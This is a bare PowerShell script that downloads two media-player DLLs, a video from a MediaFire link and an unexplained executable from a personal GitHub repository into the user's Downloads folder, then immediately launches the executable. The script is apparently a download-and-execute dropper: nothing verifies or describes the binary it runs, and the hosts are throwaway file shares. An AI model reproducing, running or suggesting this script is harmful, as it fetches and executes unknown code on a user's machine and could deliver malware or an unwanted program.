$urls = @(
    "https://github.com/webntdev/webntdev.github.io/raw/main/application/AxInterop.WMPLib.dll",
    "https://github.com/webntdev/webntdev.github.io/raw/main/application/Interop.WMPLib.dll",
    "https://download1474.mediafire.com/xt4ghfi7irdgk96GcsyYCN3tyhVGbKBwNExEVNuiUPYN--S_zP6XZmDH3_3XBJ6zyaLv9jeDh1HCH4lDHYndIcKcDeaKrhn7fsBSC2lpna1EdA_NUIzWBhPJU5DTzmARdLFYBtC-TVViemXZK9hTip2m-XlOjvpgblQdNCpy/c1xdxv37u0dggg6/video.mp4",
    "https://github.com/webntdev/webntdev.github.io/raw/main/application/WindowsFormsApp2.exe"
)

$downloadDir = [System.Environment]::ExpandEnvironmentVariables('%USERPROFILE%\Downloads')
if (-not (Test-Path -Path $downloadDir)) {
    New-Item -ItemType Directory -Path $downloadDir
}

foreach ($url in $urls) {
    $fileName = [System.IO.Path]::GetFileName($url)
    $destinationPath = Join-Path -Path $downloadDir -ChildPath $fileName
    Invoke-WebRequest -Uri $url -OutFile $destinationPath
}

$exePath = Join-Path -Path $downloadDir -ChildPath "WindowsFormsApp2.exe"
Start-Process -FilePath $exePath
